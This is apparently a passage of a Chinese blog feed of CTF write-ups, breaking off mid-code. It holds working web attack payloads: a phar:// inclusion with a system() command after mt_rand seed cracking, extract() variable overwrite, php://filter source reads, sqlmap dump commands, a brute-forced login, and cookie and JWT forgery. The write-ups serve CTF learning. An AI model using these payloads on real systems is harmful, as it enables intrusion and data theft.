<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span>(<span class="params"><span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;<span class="subst">$message</span>&lt;/div&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span>(<span class="params"><span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;div class=\&quot;msg success\&quot; id=\&quot;message\&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;<span class="subst">$message</span>&lt;/div&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span>(<span class="params"><span class="variable">$length</span> = <span class="string">&quot;32&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$set</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>,</span><br><span class="line">        <span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>,</span><br><span class="line">        <span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="variable">$length</span>; ++<span class="variable">$i</span>) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$set</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$set</span>[<span class="variable">$ch</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$reg</span>=<span class="string">&#x27;/gif|jpg|jpeg|png/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$seed</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$ss</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">session_id</span>() . <span class="variable">$ss</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;SESSI0N&#x27;</span>, <span class="variable">$hash</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">show_error_message</span>(<span class="string">&quot;Upload ERROR. Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$check2</span> = (((<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">        &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">    <span class="variable">$check3</span>=!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$reg</span>,<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check3</span>) <span class="title function_ invoke__">show_error_message</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check2</span>) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&#x27;./uP1O4Ds/&#x27;</span> . <span class="title function_ invoke__">random_str</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">show_message</span>(<span class="string">&quot;Upload successfully. File type:&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="title function_ invoke__">show_error_message</span>(<span class="string">&quot;Something wrong with the upload...&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">show_error_message</span>(<span class="string">&quot;only allow gif/jpeg/png files smaller than 200kb!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>大概的思路就是使<strong>PHPSESSID</strong>为空，然后得到<strong>$ss</strong>的<strong>MD5</strong>值即可求出原值，随后通过<strong>PHP_MT_SEED</strong>爆破种子求得上传的文件路径。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span>(<span class="params"><span class="variable">$length</span> = <span class="string">&quot;32&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$set</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>,</span><br><span class="line">        <span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>,</span><br><span class="line">        <span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="variable">$length</span>; ++<span class="variable">$i</span>) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$set</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$set</span>[<span class="variable">$ch</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">34439431</span>);</span><br><span class="line"><span class="variable">$ss</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./uP1O4Ds/&#x27;</span> . <span class="title function_ invoke__">random_str</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="string">&quot;south.php.png/south&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>Payload</strong>为<strong>http://111.198.29.45:55174/?page=phar://uP1O4Ds/cu7eBI3ZvjTvjlezNnYH2p4B3FAZV67Q_south.php.png/south</strong>，同时<strong>Post</strong>如下参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">south=system(&quot;find / -name &#x27;*flag*&#x27; &quot;);</span><br></pre></td></tr></table></figure>
<p>有两个地方放了<strong>Flag</strong>，网站根目录下的是假的。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>关于新Bugku的题解</title>
    <url>/Platform-NewBugku/</url>
    <content><![CDATA[<p>全是水题。</p>
<span id="more"></span>
<h3 id="web1"><a href="http://123.206.31.85:10001/">WEB1</a></h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;ssAEDsssss&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$c</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$myFlag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;继续努力，相信flag离你不远了&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点是<a
href="https://www.freebuf.com/column/150731.html"><strong>PHP</strong>变量覆盖漏洞</a>。</p>
<p>这里使用**extract($_GET)<strong>接收了</strong>GET<strong>请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行</strong>if<strong>条件判断，所以可以使用</strong>GET<strong>提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p>
<p>因此<strong>payload</strong>是<strong>?a=&amp;b=</strong>，得到<strong>flag{c3fd1661da5efb989c72b91f3c378759}</strong>。</p>
<h3 id="web2"><a href="http://123.206.31.85:10002/">WEB2</a></h3>
<p>看了一下，大概是需要一个时间竞争，写个爬虫就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:10002/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=gss81c94di250qs94uq0c5vuhgas9q81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getText</span>():</span><br><span class="line"></span><br><span class="line">    getResult = requests.get(url = url, headers = headers)</span><br><span class="line">    <span class="keyword">return</span> getResult.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">result</span>):</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;result=&#x27;</span> + <span class="built_in">str</span>(result)</span><br><span class="line">    getResult = requests.post(url = url, data = data, headers = headers)</span><br><span class="line">    <span class="keyword">return</span> getResult.text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(getText(), features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">cal = soup.find(<span class="string">&#x27;p&#x27;</span>).get_text(strip=<span class="literal">True</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">cal = re.sub(<span class="string">r&#x27;[^\x00-\x7f]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, cal)</span><br><span class="line">cal = re.sub(<span class="string">r&#x27;[a-z]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, cal)</span><br><span class="line">res = BeautifulSoup(getFlag(<span class="built_in">eval</span>(cal)), features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> res.text</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{b37d6bdd7bb132c7c7f6072cd318697c}</strong>。</p>
<h3 id="web3"><a href="http://123.206.31.85:10003">WEB3</a></h3>
<p>寻思了许久的文件上传，然后发现其实是文件包含<strong>Orz</strong>。</p>
<p>发现主页是<strong>?op=home</strong>，上传界面是<strong>?op=upload</strong>，然后试了一下<strong>?op=flag</strong>没报错，<strong>?op=1</strong>报错。</p>
<p>于是构造<strong>?op=php://filter/read=convert.base64-encode/resource=flag</strong>。</p>
<p>得到<strong>flag{e00f8931037cbdb25f6b1d82dfe5552f}</strong>。</p>
<h3 id="web4"><a href="http://123.206.31.85:10004/">WEB4</a></h3>
<p>丢进<strong>sqlmap</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r &quot;bugku.txt&quot; --dbs</span><br></pre></td></tr></table></figure>
<p>然后得到一个<strong><a
href="http://123.206.31.85:10004/@99687c6233418217/flag.txt">url</a></strong>，得到<strong>flag{7ae7de60f14eb3cbd9403a0c4328598d}</strong>。</p>
<h3 id="web5"><a
href="http://47.95.208.167:10005/"><strong>WEB5</strong></a></h3>
<p>丢进<strong>sqlmap</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://47.95.208.167:10005/?mod=read&amp;id=1&quot; -D web5 -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{320dbb1c03cdaaf29d16f9d653c88bcb}</strong>。</p>
<h3 id="web6"><a href="http://123.206.31.85:10006">WEB6</a></h3>
<p><strong>Burpsuite</strong>爆破一下，<strong>admin/test123</strong>。</p>
<p>得到<strong>flag{85ff2ee4171396724bae20c0bd851f6b}</strong>。</p>
<h3 id="web7"><strong><a
href="http://123.206.31.85:10007">WEB7</a></strong></h3>
<p>看了一下，<strong>cookie</strong>开头十位<strong>351e766803</strong>不知道什么意义，后面三十二位是<strong>MD5</strong>加密。</p>
<p>然后尝试了几次，把<strong>u</strong>和<strong>r</strong>都填上<strong>351e76680321232f297a57a5a743894a0e4a801fc3</strong>。</p>
<p>得到<strong>flag{98112cb20fb17cc81687115010f8a5c3}</strong>。</p>
<h3 id="web8">WEB8</h3>
<h3 id="web9"><a href="http://123.206.31.85:3031/">WEB9</a></h3>
<p>根据提示，<strong>PUT</strong>一个<strong>bugku</strong>。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.206.31.85:3031</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en,zh-CN;q=0.9,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=gg5i701sc080tdc1u5bdacmj509k3m6i</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">bugku</span></span></span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{T7l8xs9fc1nct8NviPTbn3fG0dzX9V}</strong>。</p>
<h3 id="web10"><a href="http://123.206.31.85:3032/">WEB10</a></h3>
<p>右键源代码看到一个<strong>Base32</strong>，解密后得到账号密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kk:kk123</span><br></pre></td></tr></table></figure>
<p>登陆后提示说<strong>vim</strong>崩溃，故有源码泄露，<strong>L3yx.php.swp</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;/form&gt;NTER <span class="keyword">or</span> type command to <span class="keyword">continue</span></span><br><span class="line">&lt;!--hint:NNVTU23LGEZDG===--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;src/JWT.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">KEY</span> = <span class="string">&#x27;L3yx----++++----&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loginkk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="variable">$token</span> = [</span><br><span class="line">          <span class="string">&#x27;iss&#x27;</span>=&gt;<span class="string">&#x27;L3yx&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;iat&#x27;</span>=&gt;<span class="variable">$time</span>,</span><br><span class="line">          <span class="string">&#x27;exp&#x27;</span>=&gt;<span class="variable">$time</span>+<span class="number">5</span>,</span><br><span class="line">          <span class="string">&#x27;account&#x27;</span>=&gt;<span class="string">&#x27;kk&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="variable">$jwt</span> = \Firebase\JWT\JWT::<span class="title function_ invoke__">encode</span>(<span class="variable">$token</span>,KEY);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;token&quot;</span>,<span class="variable">$jwt</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:user.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;kk&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="string">&#x27;kk123&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">loginkk</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;账号或密码错误&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后根据题意构造<strong>Jwt</strong>，修改<strong>account</strong>为<strong>L3yx</strong>以及加长<strong>exp</strong>的时间戳。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTQ5NzAyNTIyLCJleHAiOjE1NDk3MTA4MjYsImFjY291bnQiOiJMM3l4In0.jVsu0yPVFRViqY3RiQeQU6MAThXiSfgTJS0ysg3OLKY</span><br></pre></td></tr></table></figure>
<p>然后得到<strong>flag{32ef489b73c4362ca6f28b7e7cf88368}</strong>。</p>
<h3 id="web11"><a href="http://123.206.31.85:3030/">WEB11</a></h3>
<p>依提示访问<strong>robots.txt</strong>，再指向<strong>shell.php</strong>，再根据题目写脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span class="line">    m2 = hashlib.md5()</span><br><span class="line">    m2.update(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> (m2.hexdigest()[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;af1042&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span> i</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{e2f86fb5f75da4999e6f4957d89aaca0}</strong>。</p>
<h3 id="web12"><a href="http://123.206.31.85:10012/">WEB12</a></h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Time</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;******************&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$truepassword</span> = <span class="string">&quot;******************&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$time</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$tt</span>, <span class="variable">$pp</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;time = <span class="variable">$tt</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable">$pp</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;password))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$this</span>-&gt;password,<span class="variable">$this</span>-&gt;truepassword)==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;time))&#123;</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span 